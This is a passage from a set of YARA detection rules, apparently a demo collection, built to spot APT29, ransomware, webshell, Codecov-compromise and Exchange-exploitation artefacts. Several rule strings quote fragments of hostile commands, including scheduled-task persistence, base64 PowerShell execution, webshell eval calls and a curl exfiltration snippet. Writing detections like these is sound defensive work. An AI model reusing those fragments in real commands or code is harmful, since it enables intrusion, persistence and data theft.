45 f4 50 e8 d8 05 00 00 cc 8b 41 04 } \n      $xc1 = { 2E 64 6C 6C 00 00 00 00 41 53 4B 4F 44 00 00 00\n               53 75 63 63 65 73 73 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( $xc1 or 3 of them )\n}\n\nrule APT_APT29_NOBELIUM_LNK_Samples_May21_1_RID3350 : APT DEMO FILE G0016 G0118 RUSSIA T1210 T1218_011 T1547_009 {\n   meta:\n      description = \"Detects link file characteristics as described in APT29 NOBELIUM report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\"\n      date = \"2021-05-27 14:42:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"24caf54e7c3fe308444093f7ac64d6d520c8f44ea4251e09e24931bdb72f5548\"\n      tags = \"APT, DEMO, FILE, G0016, G0118, RUSSIA, T1210, T1218_011, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"rundll32.exe\" wide\n      $sa1 = \"IMGMountingService.dll\" wide\n      $sa2 = \"MountImgHelper\" wide\n      $sb1 = \"diassvcs.dll\" wide\n      $sb2 = \"InitializeComponent\" wide\n      $sc1 = \"MsDiskMountService.dll\" wide\n      $sc2 = \"DiskDriveIni\" wide\n      $sd1 = \"GraphicalComponent.dll\" wide\n      $sd2 = \"VisualServiceComponent\" wide\n      $se1 = \"data/mstu.dll,MicrosoftUpdateService\" wide\n   condition: \n      uint16 ( 0 ) == 0x004c and filesize < 4KB and $a1 and ( all of ( $sa* ) or all of ( $sb* ) or all of ( $sc* ) or all of ( $sd* ) or all of ( $se* ) )\n}\n\nrule APT_APT29_NOBELIUM_BoomBox_May21_1_RID31ED : APT DEMO EXE FILE G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects BoomBox malware as described in APT29 NOBELIUM report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\"\n      date = \"2021-05-27 13:43:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-20\"\n      tags = \"APT, DEMO, EXE, FILE, G0016, G0118, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"]::FromBase64String($\" ascii wide\n      $xa1 = \"123do3y4r378o5t34onf7t3o573tfo73\" ascii wide fullword\n      $xa2 = \"1233t04p7jn3n4rg\" ascii wide fullword\n      $s1 = \"\\\\Release\\\\BOOM.pdb\" ascii\n      $s2 = \"/files/upload\" ascii\n      $s3 = \"/tmp/readme.pdf\" ascii fullword\n      $s4 = \"/new/{0}\" ascii fullword\n      $s5 = \"(&(objectClass=user)(objectCategory=person))\" \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d or 1 of ( $a* ) ) and ( 1 of ( $x* ) or 3 of ( $s* ) )\n}\n\nrule APT_APT29_NOBELIUM_BoomBox_PDF_Masq_May21_1_RID3517 : APT DEMO G0016 G0118 RUSSIA {\n   meta:\n      description = \"Detects PDF documents as used by BoomBox as described in APT29 NOBELIUM report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\"\n      date = \"2021-05-27 15:58:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0016, G0118, RUSSIA\"\n      required_modules = \"math\"\n      minimum_yara = \"3.3.0\"\n      \n   strings:\n      $ah1 = { 25 50 44 46 2d 31 2e 33 0a 25 } \n      $af1 = { 0a 25 25 45 4f 46 0a } \n      $fp1 = \"endobj\" ascii\n      $fp2 = \"endstream\" ascii\n      $fp3 = { 20 6F 62 6A 0A } \n   condition: \n      $ah1 at 0 and $af1 at ( filesize - 7 ) and filesize < 100KB and math.entropy ( 16 , filesize ) > 7 and not 1 of ( $fp* )\n}\n\nrule APT_APT29_NOBELIUM_NativeZone_Loader_May21_1_RID35F0 : APT DEMO EXE G0016 G0118 RUSSIA T1218_011 {\n   meta:\n      description = \"Detects NativeZone loader as described in APT29 NOBELIUM report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\"\n      date = \"2021-05-27 16:34:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"136f4083b67bc8dc999eb15bb83042aeb01791fc0b20b5683af6b4ddcf0bbc7d\"\n      tags = \"APT, DEMO, EXE, G0016, G0118, RUSSIA, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\SystemCertificates\\\\Lib\\\\CertPKIProvider.dll\" ascii\n      $s2 = \"rundll32.exe %s %s\" ascii fullword\n      $s3 = \"eglGetConfigs\" ascii fullword\n      $op1 = { 80 3d 74 8c 01 10 00 0f 85 96 00 00 00 33 c0 40 b9 6c 8c 01 10 87 01 33 db 89 5d fc } \n      $op2 = { 8b 46 18 e9 30 ff ff ff 90 87 2f 00 10 90 2f 00 10 } \n      $op3 = { e8 14 dd ff ff 8b f1 80 3d 74 8c 01 10 00 0f 85 96 00 00 00 33 c0 40 b9 6c 8c 01 10 87 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them or 4 of them\n}\n\nrule EXPL_CVE_2021_31166_Accept_Encoding_May21_1_RID34B9 : CVE_2021_31166 DEMO EXPLOIT {\n   meta:\n      description = \"Detects malformed Accept-Encoding header field as used in code exploiting CVE-2021-31166\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/0vercl0k/CVE-2021-31166\"\n      date = \"2021-05-21 15:42:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_31166, DEMO, EXPLOIT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /[Aa]ccept\\-[Ee]ncoding: [a-z\\-]{1,16},([a-z\\-\\s]{1,16},|)*[\\s]{1,20},/ \n   condition: \n      1 of them\n}\n\nrule MAL_RANSOM_Darkside_May21_1_RID3019 : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects Darkside Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/020c1740-717a-4191-8917-5819aa25f385/\"\n      date = \"2021-05-10 12:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ec368752c2cf3b23efbfa5705f9e582fc9d6766435a7b8eea8ef045082c6fbce\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 85 c9 75 ed ff 75 10 ff b5 d8 fe ff ff ff b5 dc fe ff ff e8 7d fc ff ff ff 8d cc fe ff ff 8b 8d cc fe ff ff } \n      $op2 = { 66 0f 6f 06 66 0f 7f 07 83 c6 10 83 c7 10 49 85 c9 75 ed 5f } \n      $op3 = { 6a 00 ff 15 72 0d 41 00 ab 46 81 fe 80 00 00 00 75 2e 6a ff 6a 01 } \n      $op4 = { 0f b7 0c 5d 88 0f 41 00 03 4c 24 04 89 4c 24 04 83 e1 3f 0f b7 14 4d 88 0f 41 00 03 54 24 08 89 54 24 08 83 e2 3f } \n      $s1 = \"http://darksid\" ascii\n      $s2 = \"[ Welcome to DarkSide ]\" ascii\n      $s3 = \".onion/\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them or all of ( $op* ) or all of ( $s* )\n}\n\nrule VULN_Dell_BIOS_Update_Driver_DBUtil_May21_RID35BB : CVE_2021_21551 DEMO EXE FILE T1068 VULN {\n   meta:\n      description = \"Detects vulnerable DELL BIOS update driver that allows privilege escalation as reported in CVE-2021-21551 - DBUtil_2_3.Sys - note: it's usual location is in the C:\\\\Windows\\\\Temp folder\"\n      author = \"Florian Roth\"\n      reference = \"https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/\"\n      date = \"2021-05-05 16:25:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5\"\n      hash2 = \"ddbf5ecca5c8086afde1fb4f551e9e6400e94f4428fe7fb5559da5cffa654cc1\"\n      tags = \"CVE_2021_21551, DEMO, EXE, FILE, T1068, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\DBUtilDrv2\" ascii\n      $s2 = \"DBUtil_2_3.Sys\" ascii fullword\n      $s3 = \"[ Dell BIOS Utility Driver - \" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule MAL_RANSOM_Lorenz_May21_1_RID2F6C : CRIME DEMO EXE FILE MAL RANSOM T1047 T1053_005 {\n   meta:\n      description = \"Detects Lorenz Ransomware samples\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - DACH TE\"\n      date = \"2021-05-04 11:56:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4b1170f7774acfdc5517fbe1c911f2bd9f1af498f3c3d25078f05c95701cc999\"\n      hash2 = \"8258c53a44012f6911281a6331c3ecbd834b6698b7d2dbf4b1828540793340d1\"\n      hash3 = \"c0c99b141b014c8e2a5c586586ae9dc01fd634ea977e2714fbef62d7626eb3fb\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM, T1047, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"process call create \\\"cmd.exe /c schtasks /Create /F /RU System /SC ONLOGON \" ascii fullword\n      $x2 = \"-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCn7fL/1qsWkJkUtXKZIJNqYfnVByVhK\" ascii fullword\n      $s1 = \"process call create \\\"cmd.exe /c schtasks /Create /F \" ascii fullword\n      $s2 = \"twr.ini\" ascii fullword\n      $s3 = \"/c wmic /node:'\" ascii fullword\n      $op1 = { 0f 4f d9 81 ff dc 0f 00 00 5f 8d 4b 0? 0f 4e cb 83 fe 3c 5e 5b } \n      $op2 = { 6a 02 e8 ?? ?? 0? 00 83 c4 18 83 f8 01 75 01 cc 6a 00 68 ?? ?? 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( 1 of ( $x* ) or all of ( $op* ) or 3 of them )\n}\n\nrule APT_UNC2447_MAL_RANSOM_HelloKitty_May21_1_RID3455 : APT CRIME DEMO EXE MAL RANSOM T1047 {\n   meta:\n      description = \"Detects HelloKitty Ransomware samples from UNC2447 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html\"\n      date = \"2021-05-01 15:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"02a08b994265901a649f1bcf6772bc06df2eb51eb09906af9fd0f4a8103e9851\"\n      hash2 = \"0e5f7737704c8f25b2b8157561be54a463057cd4d79c7e016c30a1cf6590a85c\"\n      hash3 = \"52dace403e8f9b4f7ea20c0c3565fa11b6953b404a7d49d63af237a57b36fd2a\"\n      tags = \"APT, CRIME, DEMO, EXE, MAL, RANSOM, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xop1 = { 8b 45 08 8b 75 f4 fe 85 f7 fd ff ff 0f 11 44 05 b4 83 c0 10 89 45 08 83 f8 30 7c 82 } \n      $xop2 = { 81 c3 dc a9 b0 5c c1 c9 0b 33 c8 89 55 a0 8b c7 8b 7d e0 c1 c8 06 33 f7 } \n      $s1 = \"select * from Win32_ShadowCopy\" wide fullword\n      $s2 = \"bootfont.bin\" wide fullword\n      $s3 = \"DECRYPT_NOTE.txt\" wide fullword\n      $s4 = \".onion\" wide\n      $sop1 = { 8b f9 0f 57 c0 68 18 01 00 00 6a 00 0f 11 45 dc 8d 5f 20 53 0f 11 45 ec } \n      $sop2 = { 56 57 8b f9 0f 57 c0 68 18 01 00 00 6a 00 0f 11 45 dc 8d 5f 20 } \n      $sop3 = { 57 8b f9 0f 57 c0 68 18 01 00 00 6a 00 0f 11 45 dc 8d 5f 20 53 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of ( $x* ) or 3 of them\n}\n\nrule APT_UNC2447_MAL_RANSOM_HelloKitty_May21_2_RID3456 : APT CRIME DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects HelloKitty Ransomware samples from UNC2447 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html\"\n      date = \"2021-05-01 15:26:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"10887d13dba1f83ef34e047455a04416d25a83079a7f3798ce3483e0526e3768\"\n      hash2 = \"3ae7bedf236d4e53a33f3a3e1e80eae2d93e91b1988da2f7fcb8fde5dcc3a0e9\"\n      hash3 = \"501487b025f25ddf1ca32deb57a2b4db43ccf6635c1edc74b9cff54ce0e5bcfe\"\n      tags = \"APT, CRIME, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xop1 = { 50 8d 45 f8 50 ff 75 fc ff 15 ?? ?? 42 00 3d ea 00 00 00 75 18 83 7d f8 00 } \n      $s1 = \"HelloKittyMutex\" wide\n      $s2 = \"%s\\\\read_me_lkd.txt\" wide fullword\n      $s3 = \"/C ping 127.0.0.1 & del %s\" wide fullword\n      $s4 = \"(%d) [%d] %s: STOP DOUBLE PROCESS RUN\" ascii fullword\n      $sop1 = { 6a 00 6a 01 ff 75 fc ff 15 ?? ?? 42 00 85 c0 0f 94 c3 ff 75 fc ff 15 ?? ?? 42 00 } \n      $sop2 = { 74 12 6a 00 6a 01 ff 75 fc ff 15 ?? ?? 42 00 85 c0 0f 94 c3 ff 75 fc } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of ( $x* ) or 2 of them\n}\n\nrule APT_UNC2447_PS1_WARPRISM_May21_1_RID308C : APT DEMO SCRIPT T1059_001 {\n   meta:\n      description = \"Detects WARPRISM PowerShell samples from UNC2447 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html\"\n      date = \"2021-05-01 12:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3090bff3d16b0b150444c3bfb196229ba0ab0b6b826fa306803de0192beddb80\"\n      hash2 = \"63ba6db8c81c60dd9f1a0c7c4a4c51e2e56883f063509ed7b543ad7651fd8806\"\n      hash3 = \"b41a303a4caa71fa260dd601a796033d8bfebcaa6bd9dfd7ad956fac5229a735\"\n      tags = \"APT, DEMO, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if ($MyInvocation.MyCommand.Path -match '\\\\S') {\" ascii fullword\n      $s1 = \"[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr \" ascii wide\n      $s2 = \"[Runtime.InteropServices.Marshal]::Copy($\" ascii wide\n      $s3 = \"[System.Diagnostics.Process]::Start((-join(\" ascii wide\n   condition: \n      filesize < 5000KB and 1 of ( $x* ) or 2 of them\n}\n\nrule APT_UNC2447_BAT_Runner_May21_1_RID3094 : APT DEMO SCRIPT {\n   meta:\n      description = \"Detects Batch script runners from UNC2447 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html\"\n      date = \"2021-05-01 12:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-07\"\n      hash1 = \"ccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell.exe -c \\\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([IO.File]::\" ascii\n      $x2 = \"wwansvc.txt')))\\\" | powershell.exe -\" ascii\n   condition: \n      filesize < 5000KB and 1 of them\n}\n\nrule MAL_Passwordstate_Moserware_Backdoor_Apr21_1_RID37CB : DEMO EXE MAL {\n   meta:\n      description = \"Detects backdoor used in Passwordstate incident\"\n      author = \"Florian Roth\"\n      reference = \"https://thehackernews.com/2021/04/passwordstate-password-manager-update.html\"\n      date = \"2021-04-25 17:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c2169ab4a39220d21709964d57e2eafe4b68c115061cbb64507cfbbddbe635c6\"\n      hash2 = \"f23f9c2aaf94147b2c5d4b39b56514cd67102d3293bdef85101e2c05ee1c3bf9\"\n      tags = \"DEMO, EXE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"https://passwordstate-18ed2.kxcdn.com\" wide\n      $s1 = \" ProxyUserName, ProxyPassword FROM [SystemSettings]\" wide fullword\n      $s2 = \"PasswordstateService.Passwordstate.Crypto\" wide\n      $s3 = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari\" wide fullword\n      $op1 = { 00 4c 00 4e 00 43 00 4c 00 49 00 31 00 31 00 3b 00 00 17 } \n      $op2 = { 4c 00 49 00 31 00 31 00 3b 00 00 17 50 00 72 00 } \n      $op3 = { 61 00 74 00 65 00 2d 00 31 00 38 00 65 00 64 00 32 00 2e 00 6b 00 78 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 3 of them\n}\n\nrule APT_SH_CodeCov_Hack_Apr21_1_RID303D : APT DEMO FILE SCRIPT T1059_004 {\n   meta:\n      description = \"Detects manipulated Codecov bash uploader tool that has been manipulated by an unknown actor during March / April 2021\"\n      author = \"Florian Roth\"\n      reference = \"https://about.codecov.io/security-update/\"\n      date = \"2021-04-16 12:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, SCRIPT, T1059_004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Global report uploading tool for Codecov\" \n      $s1 = \"curl -sm 0.5 -d\" \n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 70KB and all of them\n}\n\nrule WEBSHELL_ASPX_FileExplorer_Mar21_1_RID32A4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Chopper like ASPX Webshells\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-03-31 14:13:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<span style=\\\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\\\" onclick=\" ascii\n      $xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64\n               20 72 75 6E 61 74 3D 22 73 65 72 76 65 72 22 20\n               49 44 3D 22 ?? ?? ?? ?? ?? 22 20 2F 3E 3C 62 72\n               20 2F 3E 3C 62 72 20 2F 3E 20 50 72 6F 63 65 73\n               73 20 4E 61 6D 65 3A 3C 61 73 70 3A 54 65 78 74\n               42 6F 78 20 49 44 3D } \n      $xc2 = { 22 3E 43 6F 6D 6D 61 6E 64 3C 2F 6C 61 62 65 6C\n               3E 3C 69 6E 70 75 74 20 69 64 3D 22 ?? ?? ?? ??\n               ?? 22 20 74 79 70 65 3D 22 72 61 64 69 6F 22 20\n               6E 61 6D 65 3D 22 74 61 62 73 22 3E 3C 6C 61 62\n               65 6C 20 66 6F 72 3D 22 ?? ?? ?? ?? ?? 22 3E 46\n               69 6C 65 20 45 78 70 6C 6F 72 65 72 3C 2F 6C 61\n               62 65 6C 3E 3C 25 2D 2D } \n      $r1 = \"(Request.Form[\" ascii\n      $s1 = \".Text + \\\" Created!\\\";\" ascii\n      $s2 = \"DriveInfo.GetDrives()\" ascii\n      $s3 = \"Encoding.UTF8.GetString(FromBase64String(str.Replace(\" ascii\n      $s4 = \"encodeURIComponent(btoa(String.fromCharCode.apply(null, new Uint8Array(bytes))));;\" \n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them\n}\n\nrule WEBSHELL_ASPX_Chopper_Like_Mar21_1_RID3288 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Chopper like ASPX Webshells\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-03-31 14:09:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://f/<script language=\\\"JScript\\\" runat=\\\"server\\\">var _0x\" ascii\n      $s2 = \"));function Page_Load(){var _0x\" ascii\n      $s3 = \";eval(Request[_0x\" ascii\n      $s4 = \"','orange','unsafe','\" ascii\n   condition: \n      filesize < 3KB and 1 of them or 2 of them\n}\n\nrule VULN_PHP_Hack_Backdoored_Zlib_Zerodium_Mar21_1_RID37D0 : DEMO VULN {\n   meta:\n      description = \"Detects backdoored PHP zlib version\"\n      author = \"Florian Roth\"\n      reference = \"https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/\"\n      date = \"2021-03-29 17:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"REMOVETHIS: sold to zerodium, mid 2017\" fullword ascii\n      $x2 = \"HTTP_USER_AGENTT\" ascii fullword\n   condition: \n      filesize < 3000KB and all of them\n}\n\nrule LOG_F5_BIGIP_Exploitation_Artefacts_CVE_2021_22986_Mar21_1_RID3A2F : CVE_2021_22986 DEMO LOG {\n   meta:\n      description = \"Detects forensic artefacts indicating successful exploitation of F5 BIG IP appliances as reported by NCCGroup\"\n      author = \"Florian Roth\"\n      reference = \"https://research.nccgroup.com/2021/03/18/rift-detection-capabilities-for-recent-f5-big-ip-big-iq-icontrol-rest-api-vulnerabilities-cve-2021-22986/\"\n      date = \"2021-03-20 19:35:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_22986, DEMO, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\",\\\"method\\\":\\\"POST\\\",\\\"uri\\\":\\\"http://localhost:8100/mgmt/tm/util/bash\\\",\\\"status\\\":200,\" ascii\n      $x2 = \"[com.f5.rest.app.RestServerServlet] X-F5-Auth-Token doesn't have value, so skipping\" ascii\n   condition: \n      1 of them\n}\n\nrule WEBSHELL_ASPX_Mar21_1_RID2D74 : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects ASPX Web Shells\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-03-12 10:32:31\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d\"\n      hash2 = \"170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc\"\n      hash3 = \"31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90\"\n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".StartInfo.FileName = 'cmd.exe';\" ascii fullword\n      $s2 = \"<xsl:template match=\\\"\\\"/root\\\"\\\">\" ascii fullword\n      $s3 = \"<?xml version=\\\"\\\"1.0\\\"\\\"?><root>test</root>\\\";\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 6KB and all of them\n}\n\nrule MAL_CRIME_RANSOM_DearCry_Mar21_1_RID3164 : CRIME DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects DearCry Ransomware affecting Exchange servers\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/phillip_misner/status/1370197696280027136\"\n      date = \"2021-03-12 13:20:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b9838da7edb0decd32b086e47a31e8f5733b5981ad8247a2f9508e232589bff\"\n      hash2 = \"e044d9f2d0f1260c3f4a543a1e67f33fcac265be114a1b135fd575b860d2b8c6\"\n      hash3 = \"feb3e6d30ba573ba23f3bd1291ca173b7879706d1fe039c34d53a4fdcdf33ede\"\n      tags = \"CRIME, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dear!!!\" ascii fullword\n      $s2 = \"EncryptFile.exe.pdb\" ascii fullword\n      $s3 = \"/readme.txt\" ascii fullword\n      $s4 = \"C:\\\\Users\\\\john\\\\\" ascii\n      $s5 = \"And please send me the following hash!\" ascii fullword\n      $op1 = { 68 e0 30 52 00 6a 41 68 a5 00 00 00 6a 22 e8 81 d0 f8 ff 83 c4 14 33 c0 5e } \n      $op2 = { 68 78 6a 50 00 6a 65 6a 74 6a 10 e8 d9 20 fd ff 83 c4 14 33 c0 5e } \n      $op3 = { 31 40 00 13 31 40 00 a4 31 40 00 41 32 40 00 5f 33 40 00 e5 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them or 5 of them\n}\n\nrule APT_LemonDuck_ForensicArtefacts_Cab_Recon_Mar21_1_RID3939 : APT DEMO FILE {\n   meta:\n      description = \"Detects suspicious CAB files used by LemonDuck for recon activity\"\n      author = \"Florian Roth\"\n      reference = \"https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3?u=dstepanic\"\n      date = \"2021-03-11 18:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ip.txt\" ascii fullword\n      $s2 = \"arp.txt\" ascii fullword\n      $s3 = \"system\" ascii fullword\n      $s4 = \"security\" ascii fullword\n   condition: \n      uint32 ( 0 ) == 0x4643534d and filesize < 10000KB and ( $s1 in ( 0 .. 200 ) and $s2 in ( 0 .. 200 ) and $s3 in ( 0 .. 200 ) and $s4 in ( 0 .. 200 ) )\n}\n\nrule LOG_CVE_2021_27065_Exchange_Forensic_Artefacts_RID36CD : CVE_2021_27065 DEMO G0125 LOG {\n   meta:\n      description = \"Detects suspicious log entries that indicate requests as described in reports on HAFNIUM activity\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/#scan-log\"\n      date = \"2021-03-10 17:11:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-03-15\"\n      tags = \"CVE_2021_27065, DEMO, G0125, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $x1 = \"ServerInfo~\" ascii wide\n      $sr1 = /\\/ecp\\/[0-9a-zA-Z]{1,3}\\.js/ ascii wide\n      $s1 = \"/ecp/auth/w.js\" ascii wide\n      $s2 = \"/owa/auth/w.js\" ascii wide\n      $s3 = \"/owa/auth/x.js\" ascii wide\n      $s4 = \"/ecp/main.css\" ascii wide\n      $s5 = \"/ecp/default.flt\" ascii wide\n      $s6 = \"/owa/auth/Current/themes/resources/logon.css\" ascii wide\n   condition: \n      $x1 and 1 of ( $s* )\n}\n\nrule LOG_CVE_2021_27065_Exchange_Forensic_Artefacts_Mar21_2_RID3940 : CVE_2021_27065 DEMO G0125 LOG {\n   meta:\n      description = \"Detects suspicious log entries that indicate requests as described in reports on HAFNIUM activity\"\n    